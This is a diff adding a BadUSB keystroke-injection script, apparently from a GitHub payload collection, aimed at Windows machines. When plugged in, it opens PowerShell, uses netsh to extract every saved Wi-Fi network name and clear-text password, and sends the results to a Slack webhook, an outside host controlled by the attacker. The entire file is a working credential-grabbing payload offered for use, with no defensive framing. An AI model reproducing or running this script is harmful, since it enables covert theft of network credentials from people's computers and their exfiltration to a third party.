@@ -1,0 +1,17 @@
+REM Title: Wifi Leaked Pass
+REM Author: Killeur
+REM Hosted : https://github.com/abderaouf93/BadUSB/
+REM Target:  Windows 7/8/10/11 
+REM Supported Layout keyboard: US/FR/DE
+REM Version: 1.0
+REM Category: Grabber
+REM Extracts the SSID and wifi shared key and send them via slack webhook
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+DELAY 2000
+ENTER
+REM Extract SSID:Pass and send it via Slack webhook (change the https://hooks.slack.com/services/<xxxxxxxx>/ webhook key part)
+STRING $leaked_ssid = $(netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object { $profile = ($_ -replace "^\s+All User Profile\s+:\s+", ""); $profileDetails = netsh wlan show profile name=$profile key=clear; $ssid = $profileDetails | Select-String -Pattern "SSID name" | ForEach-Object { ($_ -split ":")[1].Trim() -replace '"', '' }; $key = $profileDetails | Select-String -Pattern "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }; if ($ssid -ne $null -and $key -ne $null) { "${ssid}:${key}" } }) -join ' ';Invoke-RestMethod -Uri "https://hooks.slack.com/services/xxxxxxxx/xxxxxxxx/xxxxxxxxxxxxxxxx" -Method Post -ContentType 'application/json' -Body "{""text"":""$leaked_ssid""}";exit
+ENTER
